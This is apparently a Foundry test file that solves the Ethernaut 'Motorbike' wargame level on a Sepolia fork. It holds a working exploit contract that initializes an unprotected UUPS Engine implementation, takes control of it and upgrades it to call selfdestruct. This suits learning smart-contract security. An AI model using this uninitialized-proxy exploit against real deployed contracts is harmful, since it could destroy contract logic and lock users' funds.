// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/levels/25-Motorbike/Motorbike.sol";

contract ContractTest is Test {
    Motorbike level25 =
        Motorbike(payable(0x6e7589340dd57B4c42CAcF212e64bd0ec48c1D9a));

    Engine engine = Engine(0x50531FFeC89e977Ab6dC5D174D0d4a9EEd60480A);

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));
        vm.label(address(this), "Attacker");
        vm.label(
            address(0x6e7589340dd57B4c42CAcF212e64bd0ec48c1D9a),
            "Ethernaut25"
        );
    }

    function testEthernaut25() public {
        AttackContract attacker = new AttackContract(engine);
        attacker.trigger();
        // assert(getCodeSize(address(engine)) == 0);
    }

    // function getCodeSize(address _addr) internal view returns (uint256 size) {
    //     assembly {
    //         size := extcodesize(_addr)
    //     }
    // }

    receive() external payable {}
}

// Works only in the foundry test
contract AttackContract {
    Engine engine;

    constructor(Engine _engine) public {
        engine = _engine;
    }

    function trigger() public {
        engine.initialize();
        bytes memory data = abi.encodeWithSignature("kill()");
        engine.upgradeToAndCall(address(this), data);
    }

    function kill() public {
        console.log("Enter Kill");
        selfdestruct(address(this));
    }

    receive() external payable {}
}
